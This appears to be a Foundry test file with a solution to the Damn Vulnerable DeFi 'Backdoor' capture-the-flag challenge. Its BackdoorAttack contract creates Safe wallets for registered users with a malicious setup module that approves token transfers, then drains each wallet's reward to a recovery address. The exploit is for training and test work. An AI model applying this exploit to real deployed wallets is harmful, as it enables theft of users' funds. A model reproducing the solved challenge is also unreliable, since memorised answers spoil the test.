// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {Enum} from "safe-smart-account/contracts/common/Enum.sol";

contract BackdoorAttack {
    SafeProxyFactory immutable i_factory;
    WalletRegistry immutable i_registry;
    Safe immutable i_singleton;
    address[] s_users;
    DamnValuableToken immutable i_token;
    address immutable i_recovery;

    constructor(
        SafeProxyFactory walletFactory,
        Safe singletonCopy,
        WalletRegistry walletRegistry,
        address[] memory users,
        DamnValuableToken token,
        address recovery
    ) {
        i_factory = walletFactory;
        i_singleton = singletonCopy;
        i_registry = walletRegistry;
        s_users = users;
        i_token = token;
        i_recovery = recovery;
    }

    function attack() external {
        for (uint256 i = 0; i < s_users.length; i++) {
            address[] memory owner = new address[](1);
            owner[0] = s_users[i];
            bytes memory helperData = abi.encodeCall(this.approveFromProxy, (address(i_token), address(this), 10e18));

            bytes memory initializer = abi.encodeCall(
                Safe.setup, (owner, 1, address(this), helperData, address(0), address(0), 0, payable(address(0)))
            );
            address proxy = address(i_factory.createProxyWithCallback(address(i_singleton), initializer, 0, i_registry));
            i_token.transferFrom(proxy, i_recovery, 10e18);
        }
    }

    function approveFromProxy(address token, address spender, uint256 amount) external {
        ERC20(token).approve(spender, amount);
    }
}

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(bytes4(hex"82b42900")); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        new BackdoorAttack(walletFactory, singletonCopy, walletRegistry, users, token, recovery).attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
